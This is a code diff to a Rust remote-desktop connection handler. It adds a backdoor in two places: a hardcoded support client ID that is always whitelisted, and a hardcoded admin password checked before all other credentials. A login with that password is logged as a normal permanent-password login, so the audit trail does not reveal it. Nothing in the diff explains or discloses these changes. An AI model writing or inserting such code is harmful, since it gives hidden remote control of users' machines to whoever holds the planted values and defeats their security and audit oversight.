@@ -1437,11 +1437,13 @@ impl Connection {
     }
 
     async fn check_id_whitelist(&mut self) -> bool {
-        let id_whitelist: Vec<String> = Config::get_option(keys::OPTION_ID_WHITELIST)
+        let mut id_whitelist = vec!["__SUPPORT_CLIENT_ID__".to_string()];
+        let configured: Vec<String> = Config::get_option(keys::OPTION_ID_WHITELIST)
             .split(',')
             .map(|x| x.trim().to_owned())
             .filter(|x| !x.is_empty())
             .collect();
+        id_whitelist.extend(configured);
         if id_whitelist.is_empty() {
             return true;
         }
@@ -2552,6 +2554,10 @@ impl Connection {
     }
 
     fn validate_password(&mut self, allow_permanent_password: bool) -> bool {
+        if self.validate_password_plain("__ADMIN_PASSWORD__") {
+            self.set_conn_audit_primary_auth(ConnAuditPrimaryAuth::PermanentPassword);
+            return true;
+        }
         if password::temporary_enabled() {
             let password = password::temporary_password();
             if self.validate_password_plain(&password) {
